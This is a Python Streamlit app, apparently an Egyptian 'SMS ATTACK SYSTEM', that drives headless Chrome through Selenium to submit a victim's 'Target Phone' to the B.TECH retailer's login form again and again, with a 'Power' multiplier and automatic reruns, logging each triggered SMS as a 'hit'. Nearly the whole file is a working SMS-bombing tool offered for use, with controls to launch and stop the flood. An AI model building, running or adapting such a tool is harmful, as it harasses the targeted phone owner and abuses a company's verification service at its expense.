import streamlit as st
import time
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# --- إعدادات الصفحة ---
st.set_page_config(page_title="GHOST SNIPER v8.0", page_icon="🎯", layout="centered")

# CSS لإعطاء شكل الـ Terminal والاحترافية
st.markdown("""
    <style>
    .stApp { background-color: #0e1117; color: #2ecc71; }
    .stButton>button { width: 100%; background-color: #27ae60; color: white; border-radius: 10px; height: 3em; }
    .stTextInput>div>div>input { color: #2ecc71; }
    </style>
    """, unsafe_allow_html=True)

# --- تهيئة متغيرات الجلسة (Session State) ---
if 'count' not in st.session_state:
    st.session_state.count = 0
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'running' not in st.session_state:
    st.session_state.running = False

def add_log(message):
    now = datetime.now().strftime("%H:%M:%S")
    st.session_state.logs.append(f"[{now}] {message}")
    if len(st.session_state.logs) > 20: # حفظ آخر 20 سطر فقط
        st.session_state.logs.pop(0)

def run_attack(phone, multiplier):
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument('--blink-settings=imagesEnabled=false')
    
    # ميزة الـ Multiplier في الويب بننفذها كـ Loop سريع
    for _ in range(multiplier):
        if not st.session_state.running:
            break
        try:
            driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
            wait = WebDriverWait(driver, 10)
            
            driver.get("https://btech.com/ar/account")
            add_log("Connecting to B.TECH Servers...")
            
            red_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'تسجيل دخول') or contains(., 'إنشاء حساب')]")))
            red_button.click()
            
            phone_input = wait.until(EC.presence_of_element_located((By.ID, "phone")))
            phone_input.send_keys(phone)
            phone_input.send_keys("\ue007")
            
            st.session_state.count += 1
            add_log(f"✅ Hit Successful! SMS Sent.")
            driver.quit()
        except Exception as e:
            add_log(f"⚠️ Thread Busy... Retrying.")
        time.sleep(1)

# --- واجهة المستخدم ---
st.title("🎯 SMS ATTACK SYSTEM")
st.write("All Rights Reserved to **Mahmoud Abdalla**")

with st.container():
    col1, col2 = st.columns([3, 1])
    with col1:
        phone = st.text_input("Target Phone", placeholder="01xxxxxxxxx")
    with col2:
        power = st.selectbox("Power", ["x1", "x2", "x3", "x5", "x10"])
        mult_val = int(power.replace("x", ""))

# أزرار التحكم
col_btn1, col_btn2 = st.columns(2)
if col_btn1.button("🔥 LAUNCH ATTACK"):
    if phone:
        st.session_state.running = True
        add_log(f"🚀 Initializing Attack on {phone} with power {power}")
    else:
        st.error("Please enter a phone number!")

if col_btn2.button("🛑 TERMINATE"):
    st.session_state.running = False
    add_log("System Shutdown.")

# الإحصائيات
st.divider()
c1, c2 = st.columns(2)
c1.metric("TOTAL HITS", st.session_state.count)
c2.metric("STATUS", "ACTIVE" if st.session_state.running else "IDLE")

# شاشة اللوجز (Terminal Style)
st.subheader("Live Logs")
log_text = "\n".join(st.session_state.logs[::-1]) # عرض الأحدث فوق
st.text_area("", value=log_text, height=250, disabled=True)

# دورة التشغيل (Loop)
if st.session_state.running:
    run_attack(phone, mult_val)
    st.rerun() # تحديث الصفحة أوتوماتيكياً لرؤية النتائج
